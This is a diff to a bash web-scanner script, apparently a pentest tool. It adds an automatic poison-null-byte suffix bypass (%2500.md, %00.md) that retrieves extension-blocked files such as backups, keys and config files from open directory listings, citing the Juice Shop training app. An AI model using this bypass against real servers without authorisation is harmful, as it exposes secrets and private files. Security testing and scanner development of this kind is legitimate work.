@@ -330,15 +330,33 @@ open_dir_scan() {
     printf '[open-directory] %s\n' "$u" >> "$open_dir_file"
     printf '%s\n' "$_children" \
       | grep -iE '\.(bak|old|sql|env|ya?ml|zip|conf|cfg|json|md|log|tar|gz|tgz|pem|key|ini|pub|txt|csv)$' \
+      | awk 'NF && !s[$0]++' | head -n "${OPEN_DIR_FILE_MAX:-15}" \
       | while IFS= read -r href; do
           [ -n "$href" ] || continue
           case "$href" in http*) fu="$href";; /*) fu="$origin$href";; *) fu="${u%/}/$href";; esac
           printf '%s\n' "$fu" >> "$urls_file"
           printf '  -> %s\n' "$fu" >> "$open_dir_file"
+          # The listing may show files the server blocks by extension (Juice Shop /ftp: "Only .md and
+          # .pdf allowed" -> 403 on .bak/.json/.yml). A trailing poison-null-byte suffix bypasses the
+          # check: /ftp/package.json.bak%2500.md -> 200 with the real file. Find the URL that serves it.
+          ofetch="$fu"
+          ocode="$(curl -s -o /dev/null -w '%{http_code}' -L --max-time 8 ${CURL_NET[@]+"${CURL_NET[@]}"} "$fu" 2>/dev/null || echo 000)"
+          if [ "$ocode" = 403 ]; then
+            for suf in '%2500.md' '%00.md' '%2500.pdf'; do
+              bresp="$(curl -s -i -L --max-time 8 ${CURL_NET[@]+"${CURL_NET[@]}"} "$fu$suf" 2>/dev/null | head -c 6000)"
+              printf '%s' "$bresp" | grep -aiE '^HTTP/.* 200' >/dev/null 2>&1 || continue
+              printf '%s' "$bresp" | grep -aiE 'content-type:[[:space:]]*text/html' >/dev/null 2>&1 && continue  # SPA shell, not the file
+              ofetch="$fu$suf"
+              printf '[403-bypass] [null-byte] %s | 403 -> 200 via %s suffix (extension filter bypassed - file readable)\n' "$fu" "$suf" >> "${bypass_file:-/dev/null}"
+              printf '      (403-bypass -> 200) %s\n' "$ofetch" >> "$open_dir_file"
+              break
+            done
+          fi
           # dependency manifests -> feed versioned_components for CVE / typosquat / supply-chain triage
+          # (fetch via the URL that actually serves it - direct 200, or the null-byte-bypassed one)
           case "$href" in
-            package.json*|composer.json*|requirements.txt*|pom.xml*|Gemfile.lock*|yarn.lock*)
-              curl -s -L --max-time 10 ${CURL_NET[@]+"${CURL_NET[@]}"} "$fu" 2>/dev/null | head -c 60000 \
+            package.json*|package-lock.json*|composer.json*|composer.lock*|requirements.txt*|pom.xml*|Gemfile.lock*|yarn.lock*)
+              curl -s -L --max-time 10 ${CURL_NET[@]+"${CURL_NET[@]}"} "$ofetch" 2>/dev/null | head -c 60000 \
                 | grep -aoE '"[a-zA-Z0-9@._/-]+"[[:space:]]*:[[:space:]]*"[~^><= ]*[0-9][0-9A-Za-z.+-]*"' \
                 | sed -E 's/"[[:space:]]*:[[:space:]]*"/ /; s/"//g; s/[~^><= ]*//' \
                 | head -n 150 >> "${versions_file:-/dev/null}" 2>/dev/null || true ;;
